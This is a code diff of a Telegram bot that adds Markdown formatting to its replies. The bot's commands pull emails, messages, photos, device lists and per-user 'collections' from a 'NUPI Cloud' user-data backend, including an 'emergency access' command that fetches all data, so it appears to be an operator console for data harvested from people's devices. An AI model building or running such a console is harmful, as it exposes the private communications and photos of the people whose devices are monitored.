@@ -17,7 +17,7 @@ function safeSendMessage(chatId, message, useMarkdown = false) {
     try {
         if (useMarkdown) {
             // Try with Markdown first
-            return bot.sendMessage(chatId, message).catch(() => {
+            return bot.sendMessage(chatId, message, { parse_mode: 'Markdown' }).catch(() => {
                 // If Markdown fails, send as plain text
                 return bot.sendMessage(chatId, message);
             });
@@ -118,7 +118,7 @@ bot.onText(/\/emails(?:\s+(.+))?/, async (msg, match) => {
                 message += `\n_Showing 10 of ${response.data.count} emails_`;
             }
             
-            bot.sendMessage(chatId, message);
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             
         } catch (error) {
             bot.sendMessage(chatId, `❌ Error: ${error.message}`);
@@ -164,7 +164,7 @@ bot.onText(/\/messages(?:\s+(.+))?/, async (msg, match) => {
                 message += `\n_Showing 10 of ${response.data.count} messages_`;
             }
             
-            bot.sendMessage(chatId, message);
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             
         } catch (error) {
             bot.sendMessage(chatId, `❌ Error: ${error.message}`);
@@ -211,7 +211,7 @@ bot.onText(/\/photos(?:\s+(.+))?/, async (msg, match) => {
             message += `\n_Showing 5 of ${response.data.count} photos_`;
         }
         
-        bot.sendMessage(chatId, message);
+        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
         
             // Send actual photo URLs
             response.data.results.slice(0, 3).forEach(result => {
@@ -259,7 +259,7 @@ bot.onText(/\/search (.+)/, async (msg, match) => {
                 message += `\n_Showing 5 of ${response.data.count} results_`;
             }
             
-            bot.sendMessage(chatId, message);
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             
         } catch (error) {
             bot.sendMessage(chatId, `❌ Error: ${error.message}`);
@@ -305,7 +305,7 @@ bot.onText(/\/latest(?:\s+(.+))?/, async (msg, match) => {
                 message += `*Recent Message:*\n${JSON.stringify(data.messages[0]).substring(0, 200)}...\n`;
             }
             
-            bot.sendMessage(chatId, message);
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             
         } catch (error) {
             bot.sendMessage(chatId, `❌ Error: ${error.message}`);
@@ -338,7 +338,7 @@ bot.onText(/\/stream/, (msg) => {
                 message += `📧 ${item.emails.length} | 💬 ${item.messages.length} | 🖼️ ${item.photos.length}\n\n`;
             });
             
-            bot.sendMessage(chatId, message);
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             
         } catch (error) {
             bot.sendMessage(chatId, `❌ Error: ${error.message}`);
@@ -633,7 +633,7 @@ bot.onText(/\/stats/, (msg) => {
                 message += `⏱️ Last Collection: ${new Date(stats.lastCollection).toLocaleString()}`;
             }
             
-            bot.sendMessage(chatId, message);
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             
         } catch (error) {
             bot.sendMessage(chatId, `❌ Error: ${error.message}`);
@@ -671,7 +671,7 @@ bot.onText(/\/devices/, (msg) => {
                 message += `\n_Showing 20 of ${response.data.count} devices_`;
             }
             
-            bot.sendMessage(chatId, message);
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             
         } catch (error) {
             bot.sendMessage(chatId, `❌ Error: ${error.message}`);
@@ -703,7 +703,7 @@ bot.onText(/\/users/, (msg) => {
                 message += `First Seen: ${new Date(user.firstSeen).toLocaleString()}\n\n`;
             });
             
-            bot.sendMessage(chatId, message);
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             
         } catch (error) {
             bot.sendMessage(chatId, `❌ Error: ${error.message}`);
@@ -739,7 +739,7 @@ bot.onText(/\/user (.+)/, (msg, match) => {
                 message += `   📧 ${col.emails.length} | 💬 ${col.messages.length} | 🖼️ ${col.photos.length}\n`;
             });
             
-            bot.sendMessage(chatId, message);
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             
             // Send detailed device info
             if (user.devices.length > 0) {
@@ -748,7 +748,7 @@ bot.onText(/\/user (.+)/, (msg, match) => {
                     deviceMsg += `${i + 1}. ${device.deviceId.substring(0, 30)}...\n`;
                     deviceMsg += `   Collections: ${device.totalCollections}\n`;
                 });
-                bot.sendMessage(chatId, deviceMsg);
+                bot.sendMessage(chatId, deviceMsg, { parse_mode: 'Markdown' });
             }
             
         } catch (error) {
@@ -762,7 +762,7 @@ bot.onText(/\/all/, (msg) => {
     checkAuth(msg, async () => {
         const chatId = msg.chat.id;
         
-        bot.sendMessage(chatId, '🚨 *EMERGENCY ACCESS ACTIVATED*\n\nFetching ALL data from NUPI Cloud...');
+        bot.sendMessage(chatId, '🚨 *EMERGENCY ACCESS ACTIVATED*\n\nFetching ALL data from NUPI Cloud...', { parse_mode: 'Markdown' });
         
         try {
             // Get stats first
@@ -777,7 +777,7 @@ bot.onText(/\/all/, (msg) => {
             message += `💬 Messages: ${stats.totalMessages}\n`;
             message += `🖼️ Photos: ${stats.totalPhotos}\n\n`;
             
-            bot.sendMessage(chatId, message);
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             
             // Get all devices
             const devicesRes = await axios.get(`${NUPI_API}/api/user-data/devices`);
@@ -790,7 +790,7 @@ bot.onText(/\/all/, (msg) => {
                 deviceMsg += `Collections: ${device.totalCollections}\n`;
                 deviceMsg += `Use: \`/latest ${device.deviceId}\` for details`;
                 
-                bot.sendMessage(chatId, deviceMsg);
+                bot.sendMessage(chatId, deviceMsg, { parse_mode: 'Markdown' });
                 
                 // Wait 500ms between messages to avoid rate limiting
                 await new Promise(resolve => setTimeout(resolve, 500));
